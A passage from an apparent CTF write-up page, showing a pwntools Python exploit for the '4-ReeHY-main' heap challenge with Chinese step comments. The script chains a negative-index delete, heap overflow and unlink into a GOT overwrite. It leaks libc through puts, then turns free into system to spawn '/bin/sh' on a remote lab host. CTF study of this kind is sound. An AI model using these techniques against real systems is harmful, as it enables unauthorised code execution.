s="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">sh = remote(<span class="string">"10.10.31.156"</span>,<span class="string">"10001"</span>)</span><br><span class="line"><span class="comment">#sh = process(["/ctf/work/adworld/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/ld-2.23.so","./4-ReeHY-main"],env=&#123;"LD_PRELOAD":"/ctf/work/adworld/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc.so.6"&#125;)</span></span><br><span class="line"> </span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'sy\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'1\n'</span>) <span class="comment">#创造堆快0</span></span><br><span class="line">sh.sendafter(<span class="string">'Input size\n'</span>,<span class="string">'256\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input cun\n'</span>,<span class="string">'0\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input content'</span>,<span class="string">'0000\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'1\n'</span>)  <span class="comment">#创造堆快1</span></span><br><span class="line">sh.sendafter(<span class="string">'Input size\n'</span>,<span class="string">'256\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input cun\n'</span>,<span class="string">'1\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input content'</span>,<span class="string">'1111\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'2\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Chose one to dele\n'</span>,<span class="string">'-2\n'</span>)</span><br><span class="line"> </span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'1\n'</span>)   <span class="comment">#这样申请之后，再写进序号为3的堆快，就是写入保存content大小的堆快，可以随意篡改输入大小造成堆溢出</span></span><br><span class="line">sh.sendafter(<span class="string">'Input size\n'</span>,<span class="string">'20\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input cun\n'</span>,<span class="string">'3\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input content'</span>,<span class="string">'3333\n'</span>)</span><br><span class="line"> </span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'3\n'</span>)  <span class="comment">#把chunk0的可写大小改为最大，4096</span></span><br><span class="line">sh.sendafter(<span class="string">'Chose one to edit\n'</span>,<span class="string">'3\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input the content\n'</span>,p32(<span class="number">0x1000</span>))</span><br><span class="line"> </span><br><span class="line">payload = p64(<span class="number">0x0</span>) + p64(<span class="number">0x100</span>+<span class="number">1</span>)+p64(<span class="number">0x6020c8</span>) + p64(<span class="number">0x6020d0</span>)+<span class="string">b'A'</span>*(<span class="number">0x100</span><span class="number">-32</span>)+p64(<span class="number">0x100</span>) +p64(<span class="number">0x110</span>)  <span class="comment">#不改chunk1的size的话，size是0x111,表示前一个chunk分配</span></span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'3\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Chose one to edit\n'</span>,<span class="string">'0\n'</span>)</span><br><span class="line">print(<span class="string">'**************************************************************send payload  fake_chunk1_size and chunk_fake_fd+chunk_fake_bk*********************************************************************************************'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input the content\n'</span>,payload)</span><br><span class="line"> </span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'2\n'</span>)   <span class="comment">#unlink</span></span><br><span class="line">sh.sendafter(<span class="string">'Chose one to dele\n'</span>,<span class="string">'1\n'</span>)</span><br><span class="line"> </span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">puts_plt = <span class="number">0x4006d0</span></span><br><span class="line">free_got = <span class="number">0x602018</span>      <span class="comment">#把chunk0改为puts_got   chunk1改为free_got   chunk2的指针还改为0x6020e0方便再覆盖一遍</span></span><br><span class="line">payload = p64(<span class="number">0x0</span>) * <span class="number">3</span> + p64(puts_got) + p64(<span class="number">0x1</span>) + p64(free_got) + p64(<span class="number">0x1</span>)+p64(<span class="number">0x6020e0</span>) + p64(<span class="number">0x1</span>)</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'3\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Chose one to edit\n'</span>,<span class="string">'0\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input the content\n'</span>,payload)</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'3\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Chose one to edit\n'</span>,<span class="string">'1\n'</span>)  <span class="comment">#修改free got里面内容为puts_plt</span></span><br><span class="line">print(<span class="string">'**************************************************************send payload2*********************************************************************************************'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input the content\n'</span>,p64(puts_plt))</span><br><span class="line"> </span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'2\n'</span>)            <span class="comment">#此时的free就是puts，这一步操作意思为 puts(*(puts_got))</span></span><br><span class="line">sh.sendafter(<span class="string">'Chose one to dele\n'</span>,<span class="string">'0\n'</span>)</span><br><span class="line">puts_addr =  u64(sh.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">'libc6_2.23-0ubuntu11.2_amd64.so'</span>)</span><br><span class="line">base_addr = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = base_addr + next(libc.search(<span class="string">b'/bin/sh'</span>))</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'3\n'</span>)        <span class="comment">#再把free改为system</span></span><br><span class="line">sh.sendafter(<span class="string">'Chose one to edit\n'</span>,<span class="string">'1\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input the content\n'</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#再覆盖一次，前两项不变，把chunk2内容改为binsh的指针</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,gdbscript='''b *0x400c29''')#edit</span></span><br><span class="line"><span class="comment">#payload =p64(puts_got) + p64(0x1) + p64(free_got) + p64(0x1)+p64(bin_sh) + p64(0x1)</span></span><br><span class="line">payload =p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>)+p64(bin_sh) + p64(<span class="number">0x1</span>)</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'3\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Chose one to edit\n'</span>,<span class="string">'2\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input the content\n'</span>,payload)</span><br><span class="line">sh.sendafter(<span class="string">'$'</span>,<span class="string">'2\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Chose one to dele\n'</span>,<span class="string">'2\n'</span>)<span class="comment"># system('/bin/sh')</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
